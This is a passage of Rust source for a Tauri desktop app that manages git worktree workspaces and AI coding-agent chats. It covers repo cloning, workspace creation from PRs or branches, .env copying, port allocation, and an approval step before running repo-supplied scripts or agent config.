pub mod acp;
pub mod agent;
pub mod agentcfg;
pub mod checks;
pub mod cli;
pub mod mcpshare;
pub mod config;
pub mod git;
pub mod guard;
pub mod importer;
#[cfg(unix)]
pub mod linux;
pub mod names;
pub mod ports;
pub mod preview;
pub mod prompts;
pub mod prpoll;
pub mod pty;
pub mod radar;
pub mod remote;
pub mod review;
pub mod safe;
pub mod search;
pub mod stage;
pub mod store;
pub mod testparse;
pub mod title;

use serde::Serialize;
use serde_json::{json, Value};
use std::collections::{HashMap, VecDeque};
use std::io::{BufRead, BufReader};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::{Arc, Mutex, OnceLock};
use store::{new_id, Repo, Session, Store, Workspace};
use tauri::{AppHandle, Emitter, Manager, State};

type Res<T> = Result<T, String>;

fn e<E: std::fmt::Display>(err: E) -> String {
    err.to_string()
}

#[derive(Default)]
struct Runs {
    /// session id -> pid of the running agent turn
    running: HashMap<String, u32>,
    /// session id -> prompts waiting for the current turn to finish
    queued: HashMap<String, VecDeque<String>>,
    /// session id -> context the agent must hear before the next prompt (e.g. "files were rewound")
    notes: HashMap<String, String>,
    /// stdin of interactive turns ("ask before changes"), for answering permission requests.
    stdins: HashMap<String, std::process::ChildStdin>,
    /// Open permission requests: request id -> (session id, tool input, CLI suggestions).
    approvals: HashMap<String, (String, Value, Value)>,
    /// Chats whose next turn should fork the agent's conversation instead of continuing it.
    forks: std::collections::HashSet<String>,
    /// Workspaces whose files are being rewound right now. No turn may start in them meanwhile.
    rewinding: std::collections::HashSet<String>,
    /// The parser of each running turn, shared with Stop and approvals: ACP agents are stopped
    /// and answered through their protocol, not with a signal and Claude's control messages.
    parsers: HashMap<String, SharedParser>,
}

type SharedParser = Arc<Mutex<Box<dyn agent::Parser>>>;

/// Write lines to a running turn's stdin. False when it is gone (the turn ended or stdin closed).
fn write_stdin(runs: &Arc<Mutex<Runs>>, id: &str, lines: &[String]) -> bool {
    use std::io::Write;
    if lines.is_empty() {
        return true;
    }
    let mut runs = runs.lock().unwrap();
    let Some(stdin) = runs.stdins.get_mut(id) else { return false };
    lines.iter().all(|l| stdin.write_all(l.as_bytes()).is_ok()) && stdin.flush().is_ok()
}

/// Send `signal` to the turn's process after `secs`, if that same process is still running.
/// For agents that were asked to stop or to exit and might not.
fn signal_later(runs: Arc<Mutex<Runs>>, id: String, pid: u32, secs: u64, signal: &'static str) {
    std::thread::spawn(move || {
        std::thread::sleep(std::time::Duration::from_secs(secs));
        if runs.lock().unwrap().running.get(&id) == Some(&pid) {
            let _ = Command::new("kill").args([signal, &pid.to_string()]).status();
        }
    });
}

/// (per workspace: when counted, lines added and removed, changed file paths; workspaces to recount).
/// The file paths feed the collision radar, so it never runs git of its own.
type LineCache = (HashMap<String, (std::time::Instant, (u32, u32), Vec<String>)>, std::collections::HashSet<String>);

pub struct AppState {
    store: Mutex<Store>,
    runs: Arc<Mutex<Runs>>,
    ptys: pty::Ptys,
    home: PathBuf,
    /// Your GitHub login, or "purr". Looked up in the background so `gh` never delays the window.
    branch_prefix: Arc<OnceLock<String>>,
    github: Mutex<Option<Value>>,
    repo_meta: Mutex<HashMap<String, Value>>,
    /// Changed-line counts per workspace, and which ones need recounting (an agent touched them).
    lines: Mutex<LineCache>,
    /// Every workspace's PR, from the one background poller (`pr_poll_loop`).
    prs: Mutex<PrCache>,
    /// Wakes the poller early (a push, a merge, the window coming back).
    pr_wake: Mutex<Option<std::sync::mpsc::Sender<()>>>,
    /// What the `nekotrail` command and `nekotrail://` links asked the window to do.
    inbox: remote::Inbox,
    /// Workspaces whose Run script stopped on "address already in use", and the port it named
    /// (None when it didn't say). Cleared when Run starts again.
    port_failures: Mutex<HashMap<String, Option<u16>>>,
    /// Each workspace's test, lint and typecheck results, and the run going now.
    checks: checks::Checks,
}

/// What the PR poller knows. `by_branch` is keyed by (repo id, head branch): Null means "no PR".
#[derive(Default)]
struct PrCache {
    sched: prpoll::Schedule,
    by_branch: HashMap<(String, String), Value>,
    /// Branches GitHub was asked about at least once (answered or not), per repo.
    asked: std::collections::HashSet<(String, String)>,
    /// The last `pr` event each workspace got, so only changes go out.
    sent: HashMap<String, Value>,
    /// Open PRs waiting for your review, per repo id (from the same poll, one extra query).
    requests: HashMap<String, Vec<Value>>,
    /// The last `review-requests` event, so it only goes out on a change.
    sent_requests: Option<Value>,
}

impl AppState {
    fn db(&self) -> std::sync::MutexGuard<'_, Store> {
        self.store.lock().unwrap()
    }

    /// Waits for the startup lookup only if it hasn't finished yet (about half a second after launch).
    fn branch_prefix(&self) -> &str {
        self.branch_prefix.wait()
    }
}

/// GUI apps on macOS start without your shell's PATH and env (CLAUDE_CONFIG_DIR, API keys...).
/// Copy them from a login shell so `claude`, `codex`, `gh` and `git` behave like in your terminal.
/// Linux desktop launchers have the same gap (nvm, ~/.local/bin and exports from .bashrc or .zshrc).
fn load_login_env() {
    let shell = std::env::var("SHELL").unwrap_or_else(|_| pty::FALLBACK_SHELL.into());
    let Ok(out) = Command::new(shell).args(["-ilc", "env -0"]).stdin(Stdio::null()).output() else { return };
    for kv in out.stdout.split(|b| *b == 0) {
        let kv = String::from_utf8_lossy(kv);
        if let Some((k, v)) = kv.split_once('=')
            && !k.is_empty() && !k.contains(char::is_whitespace) && k != "PWD" && k != "SHLVL" {
                // SAFETY: called once at startup, before any other threads read the environment.
                unsafe { std::env::set_var(k, v) };
            }
    }
}

fn github_login() -> Option<String> {
    let out = Command::new("gh").args(["api", "user", "--jq", ".login"]).output().ok()?;
    let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
    (out.status.success() && !s.is_empty()).then_some(s)
}

// ---------- state ----------

#[derive(Serialize)]
struct Snapshot {
    repos: Vec<Repo>,
    workspaces: Vec<Workspace>,
    /// Session ids with a running agent turn.
    running: Vec<String>,
    /// Workspace ids that own a running session.
    running_workspaces: Vec<String>,
    /// Star slugs lit so far (a workspace was made), archived included.
    lit: Vec<String>,
    /// Star slugs that shine (their PR merged).
    shining: Vec<String>,
    /// Total agent spend per workspace id, in USD.
    costs: HashMap<String, f64>,
}

#[tauri::command]
async fn snapshot(st: State<'_, AppState>, include_archived: bool) -> Res<Snapshot> {
    let db = st.db();
    let running: Vec<String> = st.runs.lock().unwrap().running.keys().cloned().collect();
    let mut running_workspaces: Vec<String> =
        running.iter().filter_map(|id| db.session(id).ok().map(|s| s.workspace_id)).collect();
    running_workspaces.dedup();
    let stars = |names: Vec<String>| {
        let mut v: Vec<String> = names.iter().filter_map(|n| names::star_for(n).map(|s| s.slug.to_string())).collect();
        v.sort();
        v.dedup();
        v
    };
    let lit = stars(db.workspaces(true).map_err(e)?.into_iter().map(|w| w.name).collect());
    let shining = stars(db.merged_names().map_err(e)?);
    let costs = db.workspace_costs().map_err(e)?.into_iter().collect();
    Ok(Snapshot { repos: db.repos().map_err(e)?, workspaces: db.workspaces(include_archived).map_err(e)?, running, running_workspaces, lit, shining, costs })
}

// ---------- repos ----------

#[tauri::command]
async fn add_repo(st: State<'_, AppState>, path: String) -> Res<Repo> {
    add_repo_at(&st, &path)
}

/// Your GitHub repos (most recently pushed first), for "Clone from GitHub".
#[tauri::command]
async fn github_repos() -> Res<Value> {
    let out = gh(".", &["repo", "list", "--limit", "100", "--json", "nameWithOwner,description,pushedAt,isPrivate"])?;
    let mut v: Vec<Value> = serde_json::from_str(&out).map_err(e)?;
    v.sort_by(|a, b| b["pushedAt"].as_str().cmp(&a["pushedAt"].as_str()));
    Ok(Value::Array(v))
}

/// Clone `owner/repo` (or any URL gh understands) into ~/nekotrail/repos and add it.
#[tauri::command]
async fn clone_repo(st: State<'_, AppState>, spec: String) -> Res<Repo> {
    let spec = spec.trim().trim_end_matches(".git").to_string();
    let name = spec.rsplit(['/', ':']).next().filter(|n| !n.is_empty() && *n != "." && *n != "..").ok_or("Type the repo as owner/name.")?.to_string();
    if !safe::not_a_flag(&spec) || !safe::not_a_flag(&name) {
        return Err("Type the repo as owner/name.".into());
    }
    let dest = st.home.join("repos").join(&name);
    if dest.exists() {
        return add_repo_at(&st, &dest.to_string_lossy());
    }
    std::fs::create_dir_all(dest.parent().unwrap()).map_err(e)?;
    gh(".", &["repo", "clone", &spec, &dest.to_string_lossy()])?;
    add_repo_at(&st, &dest.to_string_lossy())
}

fn add_repo_at(st: &AppState, path: &str) -> Res<Repo> {
    let root = git::toplevel(Path::new(&path)).map_err(|_| format!("{path} isn't in a git repo. Choose a repo folder, or run git init there first."))?;
    let root_s = root.to_string_lossy().to_string();
    let db = st.db();
    if let Some(r) = db.repo_by_path(&root_s).map_err(e)? {
        return Ok(r);
    }
    let r = Repo {
        id: new_id(),
        name: root.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_else(|| "repo".into()),
        default_branch: git::default_branch(&root).map_err(e)?,
        remote_url: git::remote_url(&root),
        root_path: root_s,
        setup_script: None,
        run_script: None,
        archive_script: None,
        // .env files are git-ignored, so a fresh worktree would not have them.
        prefs: store::RepoPrefs { copy_files: vec![".env*".into()], ..Default::default() },
    };
    db.insert_repo(&r).map_err(e)?;
    Ok(r)
}

#[tauri::command]
async fn save_repo_scripts(st: State<'_, AppState>, id: String, setup: Option<String>, run: Option<String>, archive: Option<String>) -> Res<()> {
    st.db().update_repo_scripts(&id, setup.as_deref(), run.as_deref(), archive.as_deref()).map_err(e)
}

#[tauri::command]
async fn repo_branches(st: State<'_, AppState>, id: String) -> Res<Vec<String>> {
    let r = st.db().repo(&id).map_err(e)?;
    git::branches(Path::new(&r.root_path)).map_err(e)
}

fn scripts_for(st: &AppState, ws: &Workspace) -> Res<config::Scripts> {
    let r = st.db().repo(&ws.repo_id).map_err(e)?;
    Ok(config::resolve(
        Path::new(&ws.path),
        config::Scripts { setup: r.setup_script, run: r.run_script, archive: r.archive_script },
    ))
}

/// The commands this workspace's `nekotrail.json` asks to run that the user has not approved for
/// this repo yet, with their fingerprint. None when there is nothing to approve. The file comes
/// from the branch (a fresh clone, a teammate's push, a stranger's PR), so it is never run unseen.
fn untrusted_commands(st: &AppState, ws: &Workspace) -> Option<(config::Scripts, String)> {
    let (cmds, print) = config::file_commands(Path::new(&ws.path))?;
    let approved = st.db().setting(&config::trust_key(&ws.repo_id, &print)).ok().flatten().is_some();
    (!approved).then_some((cmds, print))
}

/// The `kind` script ("setup", "run" or "archive") for a workspace. Errors with "UNTRUSTED" when
/// it comes from a `nekotrail.json` the user has not approved; scripts saved in the app always run.
fn script_to_run(st: &AppState, ws: &Workspace, kind: &str) -> Res<Option<String>> {
    let pick = |s: config::Scripts| match kind {
        "setup" => Ok(s.setup),
        "run" => Ok(s.run),
        "archive" => Ok(s.archive),
        _ => Err(format!("Unknown script: {kind}.")),
    };
    if let Some((file, _)) = untrusted_commands(st, ws)
        && pick(file)?.is_some() {
            return Err("UNTRUSTED".into());
        }
    pick(scripts_for(st, ws)?)
}

/// Scripts for a workspace, plus `trust`: the repo commands that need the user's approval first
/// (null when none do).
#[tauri::command]
async fn workspace_scripts(st: State<'_, AppState>, id: String) -> Res<Value> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let s = scripts_for(&st, &ws)?;
    let trust = untrusted_commands(&st, &ws)
        .map(|(c, print)| json!({"fingerprint": print, "setup": c.setup, "run": c.run, "archive": c.archive}));
    Ok(json!({"setup": s.setup, "run": s.run, "archive": s.archive, "trust": trust}))
}

/// The user approved the repo commands they were shown. Kept per repo and fingerprint, so any
/// later change to the commands asks again.
#[tauri::command]
async fn trust_scripts(st: State<'_, AppState>, id: String, fingerprint: String) -> Res<()> {
    let ws = st.db().workspace(&id).map_err(e)?;
    match config::file_commands(Path::new(&ws.path)) {
        Some((_, print)) if print == fingerprint => st.db().set_setting(&config::trust_key(&ws.repo_id, &print), &store::now()).map_err(e),
        _ => Err("nekotrail.json changed since you looked at it. Check the commands again.".into()),
    }
}

/// What this workspace's own config for `harness` (`.claude/settings.json`, `.mcp.json`,
/// `.codex/`; `.gemini/` and `.env` for Gemini) would run, and its fingerprint, when the user has
/// not trusted those exact files for this repo. Until they do, Claude and Codex run with that
/// config switched off, and Gemini does not run.
fn untrusted_agent_config(st: &AppState, ws: &Workspace, harness: &dyn agent::Agent) -> Option<(Vec<agentcfg::Item>, String)> {
    let (items, print) = harness.repo_config(Path::new(&ws.path))?;
    let approved = st.db().setting(&config::trust_key(&ws.repo_id, &print)).ok().flatten().is_some();
    (!approved).then_some((items, print))
}

/// A workspace by its id or by the id of one of its chats, and the agent a message sent there
/// goes to: the chat's own, or for a workspace the chat `send_to_workspace` picks (its last one,
/// or a new Claude chat).
fn workspace_or_chat(st: &AppState, id: &str) -> Res<(Workspace, &'static dyn agent::Agent)> {
    let db = st.db();
    match db.workspace(id) {
        Ok(ws) => {
            let last = db.sessions(&ws.id).map_err(e)?.pop().map(|s| s.agent).unwrap_or_default();
            Ok((ws, agent::get(&last)))
        }
        Err(_) => {
            let s = db.session(id).map_err(e)?;
            Ok((db.workspace(&s.workspace_id).map_err(e)?, agent::get(&s.agent)))
        }
    }
}

/// The repo agent config the user has not trusted yet: `{repo, fingerprint, items}`, or null.
/// `id` is a workspace or a chat.
#[tauri::command]
async fn agent_config_trust(st: State<'_, AppState>, id: String) -> Res<Value> {
    let (ws, harness) = workspace_or_chat(&st, &id)?;
    let Some((items, print)) = untrusted_agent_config(&st, &ws, harness) else { return Ok(Value::Null) };
    let repo = st.db().repo(&ws.repo_id).map(|r| r.name).unwrap_or_default();
    Ok(json!({"repo": repo, "fingerprint": print, "items": items}))
}

/// The user trusted the agent config they were shown. Same store as the scripts: per repo and
/// fingerprint, so any edit to those files asks again.
#[tauri::command]
async fn trust_agent_config(st: State<'_, AppState>, id: String, fingerprint: String) -> Res<()> {
    let (ws, harness) = workspace_or_chat(&st, &id)?;
    match harness.repo_config(Path::new(&ws.path)) {
        Some((_, print)) if print == fingerprint => st.db().set_setting(&config::trust_key(&ws.repo_id, &print), &store::now()).map_err(e),
        _ => Err("The repo's agent config changed since you looked at it. Check it again.".into()),
    }
}

// ---------- workspaces ----------

/// Environment for anything running in a workspace: workspace facts, its ports (when it holds a
/// block, see `ports`), then the repo's variables from Repo settings.
fn workspace_env(repo: &Repo, ws: &Workspace, base: Option<u16>) -> Vec<(String, String)> {
    let mut env = vec![
        ("NEKOTRAIL_WORKSPACE_NAME".to_string(), ws.name.clone()),
        ("NEKOTRAIL_WORKSPACE_PATH".to_string(), ws.path.clone()),
        ("NEKOTRAIL_ROOT_PATH".to_string(), repo.root_path.clone()),
        ("NEKOTRAIL_DEFAULT_BRANCH".to_string(), ws.target_branch.clone()),
    ];
    if let Some(base) = base {
        env.extend(port_env(repo, ws, base));
    }
    env.extend(repo.prefs.env.iter().cloned());
    // A review workspace never pushes, whoever runs git in it: agent, terminal or script.
    if ws.review_pr > 0 {
        env.extend(review::read_only_env());
    }
    env
}

/// The port variables for a workspace. A variable you set yourself, exported in your shell (the
/// app copies your login shell's environment at start) or in Repo settings, is never replaced.
fn port_env(repo: &Repo, ws: &Workspace, base: u16) -> Vec<(String, String)> {
    let names = config::port_names_from_file(Path::new(&ws.path));
    ports::env(base, &names, |k| std::env::var_os(k).is_some() || repo.prefs.env.iter().any(|(x, _)| x == k))
}

/// The workspace's port block, handed out the first time it is needed. None for an archived one.
fn port_block(st: &AppState, ws: &Workspace) -> Option<u16> {
    match ports::ensure(&st.db(), &ws.id, ports::in_use) {
        Ok(b) => b,
        Err(err) => {
            eprintln!("no ports for {}: {err}", ws.id);
            None
        }
    }
}

fn env_for(st: &AppState, repo: &Repo, ws: &Workspace) -> Vec<(String, String)> {
    workspace_env(repo, ws, port_block(st, ws))
}

/// Local files that must never be committed: secrets copied into workspaces, and nekotrail's own folder.
/// Written to the repo's `.git/info/exclude` (shared by all its worktrees, never pushed). Tracked files
/// are unaffected, and `.env.example` style templates still show up.
fn ensure_local_excludes(dir: &Path, extra: &[String]) {
    let Ok(common) = git::git(dir, &["rev-parse", "--path-format=absolute", "--git-common-dir"]) else { return };
    let exclude = Path::new(&common).join("info").join("exclude");
    let cur = std::fs::read_to_string(&exclude).unwrap_or_default();
    let mut want: Vec<String> = [".nekotrail/", ".env", ".env.local", ".env.*.local"].iter().map(|s| s.to_string()).collect();
    want.extend(extra.iter().map(|g| g.trim().to_string()).filter(|g| !g.is_empty() && !g.contains("example") && !g.contains("sample")));
    let missing: Vec<&String> = want.iter().filter(|w| !cur.lines().any(|l| l.trim() == w.as_str())).collect();
    if missing.is_empty() {
        return;
    }
    let mut next = cur.clone();
    if !next.is_empty() && !next.ends_with('\n') {
        next.push('\n');
    }
    if !cur.contains("# nekotrail") {
        next.push_str("# nekotrail: local files that should never be committed\n");
    }
    for m in missing {
        next.push_str(m);
        next.push('\n');
    }
    // Broad globs like `.env*` would also hide templates that belong in the repo.
    for keep in ["!.env.example", "!.env.sample", "!.env.template"] {
        if !next.lines().any(|l| l.trim() == keep) {
            next.push_str(keep);
            next.push('\n');
        }
    }
    let _ = std::fs::create_dir_all(exclude.parent().unwrap());
    let _ = std::fs::write(&exclude, next);
}

/// `*` matches any run of characters within one path segment.
fn glob_match(pat: &str, name: &str) -> bool {
    let parts: Vec<&str> = pat.split('*').collect();
    if parts.len() == 1 {
        return pat == name;
    }
    let (first, last) = (parts[0], parts[parts.len() - 1]);
    if !name.starts_with(first) || !name[first.len()..].ends_with(last) || name.len() < first.len() + last.len() {
        return false;
    }
    let mut rest = &name[first.len()..name.len() - last.len()];
    for mid in &parts[1..parts.len() - 1] {
        match rest.find(mid) {
            Some(i) => rest = &rest[i + mid.len()..],
            None => return false,
        }
    }
    true
}

/// Copy files like `.env` (git-ignored, so not in the new worktree) from the main checkout.
/// Each glob may have a folder part (`apps/web/.env*`); the wildcard works in the file name.
fn copy_into_workspace(root: &Path, ws: &Path, globs: &[String]) -> usize {
    let mut n = 0;
    for g in globs.iter().map(|g| g.trim()).filter(|g| !g.is_empty() && !g.contains("..") && !g.starts_with('/')) {
        let (dir, pat) = g.rsplit_once('/').unwrap_or(("", g));
        let Ok(entries) = std::fs::read_dir(root.join(dir)) else { continue };
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if !entry.path().is_file() || !glob_match(pat, &name) {
                continue;
            }
            let to = ws.join(dir).join(&name);
            if !to.exists() {
                let _ = std::fs::create_dir_all(to.parent().unwrap());
                if std::fs::copy(entry.path(), &to).is_ok() {
                    n += 1;
                }
            }
        }
    }
    n
}

/// A short branch name from the first message: "Fix the 502 after deploy" -> "fix-502-after-deploy".
fn branch_slug(text: &str) -> String {
    const SKIP: &[&str] = &["a", "an", "the", "to", "of", "in", "on", "for", "and", "or", "is", "it", "this", "that", "please", "can", "you", "we", "i", "me", "my", "with", "be", "should", "could", "would"];
    let words: Vec<String> = text
        .lines()
        .next()
        .unwrap_or("")
        .split(|c: char| !c.is_ascii_alphanumeric())
        .map(|w| w.to_ascii_lowercase())
        .filter(|w| !w.is_empty() && !SKIP.contains(&w.as_str()))
        .take(5)
        .collect();
    let mut s = words.join("-");
    s.truncate(40);
    s.trim_end_matches('-').to_string()
}

#[tauri::command]
async fn create_workspace(st: State<'_, AppState>, repo_id: String, base: Option<String>, name: Option<String>, from: Option<String>) -> Res<Workspace> {
    let (repo, taken) = {
        let db = st.db();
        let repo = db.repo(&repo_id).map_err(e)?;
        let taken: Vec<String> = db.workspaces(true).map_err(e)?.into_iter().map(|w| w.name).collect();
        (repo, taken)
    };
    let root = PathBuf::from(&repo.root_path);
    let base = base.filter(|b| !b.is_empty()).unwrap_or_else(|| repo.default_branch.clone());
    let mut name = name.filter(|n| !n.trim().is_empty()).map(|n| n.trim().replace(' ', "-")).unwrap_or_else(|| names::pick(&taken));
    // These end up as git arguments and a folder name, so nothing that reads as an option or a path.
    if !safe::folder_name(&name) {
        return Err(format!("\"{name}\" can't be a workspace name. Use letters, numbers and -."));
    }
    if !safe::branch_name(&base) {
        return Err(format!("\"{base}\" isn't a valid branch name."));
    }
    let dir = st.home.join("workspaces").join(&repo.name);
    while taken.contains(&name) || dir.join(&name).exists() || git::branch_exists(&root, &format!("{}/{name}", st.branch_prefix())) {
        name = names::pick(&taken.iter().cloned().chain([name.clone()]).collect::<Vec<_>>());
    }
    let path = dir.join(&name);
    // Start from an existing PR or branch ("pr:123" / "branch:feature-x"), another workspace's
    // branch to stack a PR on it ("workspace:<id>"), or a fresh branch.
    let mut parent_id = String::new();
    let (branch, base) = match from.as_deref().and_then(|f| f.split_once(':')) {
        Some(("workspace", pid)) => {
            let parent = st.db().workspace(pid).map_err(|_| "That workspace is gone. Pick another one.".to_string())?;
            if parent.repo_id != repo.id || parent.state != "active" {
                return Err("You can only stack on an active workspace in the same repo.".into());
            }
            if !safe::branch_name(&parent.branch) {
                return Err(format!("\"{}\" isn't a valid branch name.", parent.branch));
            }
            let branch = format!("{}/{name}", st.branch_prefix());
            // From the parent's local branch, so its newest commits come along even if unpushed.
            git::add_worktree_at(&root, &path, &branch, &parent.branch).map_err(e)?;
            parent_id = parent.id;
            (branch, parent.branch)
        }
        Some(("pr", n)) => {
            if n.is_empty() || !n.chars().all(|c| c.is_ascii_digit()) {
                return Err(format!("\"{n}\" isn't a PR number."));
            }
            let info: Value = serde_json::from_str(&gh(&repo.root_path, &["pr", "view", n, "--json", "headRefName,isCrossRepository,baseRefName"])?).map_err(e)?;
            let head = info["headRefName"].as_str().unwrap_or("pr").to_string();
            let local = if info["isCrossRepository"].as_bool().unwrap_or(false) { format!("pr-{n}-{head}") } else { head };
            // The PR author picks the head branch name; it becomes a git argument here.
            if !safe::branch_name(&local) {
                return Err(format!("PR #{n} has a branch name git can't use safely: {local}"));
            }
            if !git::branch_exists(&root, &local) {
                git::git(&root, &["fetch", "--quiet", "origin", &format!("pull/{n}/head:{local}")]).map_err(e)?;
            }
            git::restore_worktree(&root, &path, &local).map_err(e)?;
            (local, info["baseRefName"].as_str().filter(|b| safe::branch_name(b)).unwrap_or(&base).to_string())
        }
        Some(("branch", b)) => {
            if !safe::branch_name(b) {
                return Err(format!("\"{b}\" isn't a valid branch name."));
            }
            let _ = git::git(&root, &["fetch", "--quiet", "origin", b]);
            if !git::branch_exists(&root, b) {
                git::git(&root, &["branch", "--track", b, &format!("origin/{b}")]).map_err(e)?;
            }
            git::restore_worktree(&root, &path, b).map_err(e)?;
            (b.to_string(), base)
        }
        _ => {
            let branch = format!("{}/{name}", st.branch_prefix());
            git::add_worktree(&root, &path, &branch, &base).map_err(e)?;
            (branch, base)
        }
    };
    let ws = Workspace {
        id: new_id(),
        repo_id,
        name,
        branch,
        path: path.to_string_lossy().to_string(),
        target_branch: base,
        state: "active".into(),
        pinned: false,
        unread: false,
        notes: String::new(),
        imported_from: None,
        created_at: store::now(),
        title: String::new(),
        status: String::new(),
        pair_id: String::new(),
        section_id: String::new(), parent_id, title_source: String::new(), review_pr: 0,
    };
    let prefs = st.db().repo(&ws.repo_id).map_err(e)?.prefs;
    ensure_local_excludes(&root, &prefs.copy_files);
    copy_into_workspace(&root, &path, &prefs.copy_files);
    st.db().insert_workspace(&ws).map_err(e)?;
    // Its ports, now, so they are the same from the first setup script on.
    let _ = port_block(&st, &ws);
    Ok(ws)
}

/// Runs the archive script, removes the worktree folder and keeps the branch.
/// Refuses when there is uncommitted work unless `force` is set.
#[tauri::command]
async fn archive_workspace(st: State<'_, AppState>, id: String, force: bool) -> Res<()> {
    archive_blocking(&st, &id, force)
}

fn archive_blocking(st: &AppState, id: &str, force: bool) -> Res<()> {
    let id = id.to_string();
    let ws = st.db().workspace(&id).map_err(e)?;
    let path = Path::new(&ws.path);
    if path.exists() {
        if !force && git::is_dirty(path).unwrap_or(false) {
            return Err("DIRTY".into());
        }
        let repo = st.db().repo(&ws.repo_id).map_err(e)?;
        // A repo archive command the user never approved is skipped, not run (archiving can be automatic).
        if let Ok(Some(script)) = script_to_run(st, &ws, "archive") {
            let _ = Command::new(std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".into()))
                .args(["-lc", &script])
                .current_dir(path)
                .envs(env_for(st, &repo, &ws))
                .status();
        }
        git::remove_worktree(Path::new(&repo.root_path), path).map_err(e)?;
    }
    // Drop its checkpoints: the branch keeps the work, and snapshots of an archived workspace
    // would only hold on to disk. Git frees them at its next gc.
    if let Ok(repo) = st.db().repo(&ws.repo_id) {
        let root = Path::new(&repo.root_path);
        let _ = git::prune_checkpoints(root, &git::checkpoint_prefix(&id), 0);
        let _ = git::prune_checkpoints(root, &guard::prefix(&id), 0);
        let _ = git::git(root, &["update-ref", "-d", &git::legacy_checkpoint_ref(&id)]);
    }
    st.ptys.close(&format!("{id}:term"));
    st.checks.stop(&id);
    st.checks.forget(&id);
    st.db().set_workspace_state(&id, "archived").map_err(e)
}

#[tauri::command]
async fn restore_workspace(st: State<'_, AppState>, id: String) -> Res<()> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let repo = st.db().repo(&ws.repo_id).map_err(e)?;
    if !Path::new(&ws.path).exists() {
        git::restore_worktree(Path::new(&repo.root_path), Path::new(&ws.path), &ws.branch).map_err(e)?;
    }
    st.db().set_workspace_state(&id, "active").map_err(e)
}

#[tauri::command]
async fn set_pinned(st: State<'_, AppState>, id: String, pinned: bool) -> Res<()> {
    st.db().set_pinned(&id, pinned).map_err(e)
}
#[tauri::command]
async fn set_unread(st: State<'_, AppState>, id: String, unread: bool) -> Res<()> {
    st.db().set_unread(&id, unread).map_err(e)
}
#[tauri::command]
async fn set_notes(st: State<'_, AppState>, id: String, notes: String) -> Res<()> {
    st.db().set_notes(&id, &notes).map_err(e)
}
#[tauri::command]
async fn review_comments(st: State<'_, AppState>, id: String) -> Res<Vec<store::ReviewComment>> {
    st.db().review_comments(&id).map_err(e)
}
#[tauri::command]
async fn add_review_comments(st: State<'_, AppState>, id: String, comments: Vec<store::ReviewComment>) -> Res<()> {
    st.db().add_review_comments(&id, &comments).map_err(e)
}
#[tauri::command]
async fn remove_review_comments(st: State<'_, AppState>, id: String, ids: Vec<String>) -> Res<()> {
    st.db().remove_review_comments(&id, &ids).map_err(e)
}
#[tauri::command]
async fn set_workspace_title(st: State<'_, AppState>, id: String, title: String) -> Res<()> {
    let title = title.trim();
    st.db().set_title(&id, title, title::USER).map_err(e)?;
    if title.is_empty() {
        // Cleared by hand: back to automatic, the PR's title if there is one, else the first prompt's.
        let ws = st.db().workspace(&id).map_err(e)?;
        let pr = cached_pr(&st, &ws).and_then(|p| p["title"].as_str().map(str::to_string)).filter(|t| !t.trim().is_empty());
        let (t, source) = match pr {
            Some(t) => (t, title::PR),
            None => (st.db().prompt_title(&id).map_err(e)?, title::AUTO),
        };
        st.db().set_title(&id, t.trim(), source).map_err(e)?;
    }
    Ok(())
}

#[tauri::command]
async fn set_workspace_status(st: State<'_, AppState>, id: String, status: String) -> Res<()> {
    st.db().set_status(&id, &status).map_err(e)
}

/// Rename the workspace's branch (only before it has been pushed).
#[tauri::command]
async fn rename_branch(st: State<'_, AppState>, id: String, branch: String) -> Res<()> {
    let ws = st.db().workspace(&id).map_err(e)?;
    review::refuse_in_review(ws.review_pr)?;
    let dir = Path::new(&ws.path);
    let branch = branch.trim().to_string();
    if branch.is_empty() || branch == ws.branch {
        return Ok(());
    }
    if git::git(dir, &["rev-parse", "--verify", "--quiet", &format!("refs/remotes/origin/{}", ws.branch)]).is_ok() {
        return Err("This branch is already pushed. Renaming it would break the PR.".into());
    }
    git::git(dir, &["check-ref-format", "--branch", &branch]).map_err(|_| format!("\"{branch}\" isn't a valid branch name. Use letters, numbers, - and /."))?;
    git::git(dir, &["branch", "-m", &ws.branch, &branch]).map_err(e)?;
    st.db().set_branch(&id, &branch).map_err(e)
}

#[tauri::command]
async fn set_repo_prefs(st: State<'_, AppState>, id: String, mut prefs: store::RepoPrefs) -> Res<()> {
    prefs.protected = config::clean_globs(std::mem::take(&mut prefs.protected));
    if let Ok(r) = st.db().repo(&id) {
        ensure_local_excludes(Path::new(&r.root_path), &prefs.copy_files);
    }
    st.db().set_repo_prefs(&id, &prefs).map_err(e)
}

#[tauri::command]
async fn set_session_effort(st: State<'_, AppState>, id: String, effort: Option<String>) -> Res<()> {
    st.db().set_session_effort(&id, effort.as_deref().filter(|e| !e.is_empty())).map_err(e)
}

/// Let this chat's agent read and edit another folder too (/add-dir). Returns the full list.
#[tauri::command]
async fn add_dir(st: State<'_, AppState>, id: String, dir: String) -> Res<Vec<String>> {
    let dir = dir.trim().replacen('~', &dirs::home_dir().unwrap_or_default().to_string_lossy(), 1);
    let p = Path::new(&dir);
    if !p.is_dir() {
        return Err(format!("{dir} isn't a folder. Check the path and try again."));
    }
    let full = p.canonicalize().map_err(e)?.to_string_lossy().to_string();
    let db = st.db();
    let mut dirs = db.extra_dirs(&id).map_err(e)?;
    if !dirs.contains(&full) {
        dirs.push(full);
    }
    db.set_extra_dirs(&id, &dirs).map_err(e)?;
    Ok(dirs)
}

/// Close a chat tab. Its history stays in the database.
#[tauri::command]
async fn hide_session(st: State<'_, AppState>, id: String) -> Res<()> {
    if st.runs.lock().unwrap().running.contains_key(&id) {
        return Err("Stop the agent before closing this chat.".into());
    }
    st.db().set_session_hidden(&id, true).map_err(e)
}

/// Backend settings: `caffeinate` and `auto_branch` ("on" / "off").
#[tauri::command]
async fn app_settings(st: State<'_, AppState>) -> Res<Value> {
    let db = st.db();
    let get = |k: &str| db.setting(k).ok().flatten().unwrap_or_else(|| "on".into());
    let raw = |k: &str| db.setting(k).ok().flatten().unwrap_or_default();
    let mut out = json!({"caffeinate": get("caffeinate"), "auto_branch": get("auto_branch"), "home": st.home.to_string_lossy()});
    // New-chat defaults per agent: claude_model, codex_effort, gemini_mode, ...
    for k in agent_setting_keys() {
